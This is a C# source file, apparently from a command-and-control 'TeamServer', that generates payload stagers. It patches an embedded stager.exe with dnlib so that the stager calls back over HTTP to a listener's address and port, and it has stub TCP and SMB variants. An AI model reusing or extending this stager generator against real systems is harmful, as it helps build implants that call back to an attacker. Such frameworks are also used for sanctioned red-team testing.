using dnlib.DotNet;
using dnlib.DotNet.Emit;

using Shared.Models;

using System;
using System.IO;
using System.Linq;

namespace TeamServer.Models
{
    public class Payload
    {
        readonly Listener Listener;

        public Payload(Listener Listener)
        {
            this.Listener = Listener;
        }

        public byte[] GenerateStager()
        {
            var stager = Helpers.GetEmbeddedResource("stager.exe");
            var md = ModuleDefMD.Load(stager);

            byte[] finalStager = null;

            switch (Listener.Type)
            {
                case Listener.ListenerType.HTTP:
                    finalStager = GenerateHTTPStager(md);
                    break;

                case Listener.ListenerType.TCP:
                    finalStager = GenerateTCPStager(md);
                    break;

                case Listener.ListenerType.SMB:
                    finalStager = GenerateSMBStager(md);
                    break;

                default:
                    break;
            }

            return finalStager;
        }

        byte[] GenerateHTTPStager(ModuleDefMD ModuleDef)
        {
            var stagerType = ModuleDef.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
            var loadCommModuleMethod = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::LoadCommModule()", StringComparison.OrdinalIgnoreCase));

            var startHTTPCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartHTTPCommModule()", StringComparison.OrdinalIgnoreCase));
            startHTTPCommModule.Body.Instructions[2].Operand = (Listener as ListenerHTTP).ConnectAddress;
            startHTTPCommModule.Body.Instructions[3].OpCode = OpCodes.Ldc_I4;
            startHTTPCommModule.Body.Instructions[3].Operand = (Listener as ListenerHTTP).ConnectPort;

            loadCommModuleMethod.Body.Instructions.Insert(1, new Instruction
            {
                Offset = 1,
                OpCode = OpCodes.Call,
                Operand = startHTTPCommModule
            });

            loadCommModuleMethod.Body.Instructions[2].Offset = 2;

            return WriteModule(ModuleDef);
        }

        byte[] GenerateTCPStager(ModuleDefMD ModuleDef)
        {
            var stagerType = ModuleDef.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
            var startTCPCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartTCPCommModule()", StringComparison.OrdinalIgnoreCase));

            return WriteModule(ModuleDef);
        }

        byte[] GenerateSMBStager(ModuleDefMD ModuleDef)
        {
            var stagerType = ModuleDef.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
            var startSMBCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartSMBCommModule()", StringComparison.OrdinalIgnoreCase));

            return WriteModule(ModuleDef);
        }

        byte[] WriteModule(ModuleDefMD ModuleDef)
        {
            using (var ms = new MemoryStream())
            {
                ModuleDef.Write(ms);
                return ms.ToArray();
            }
        }
    }
}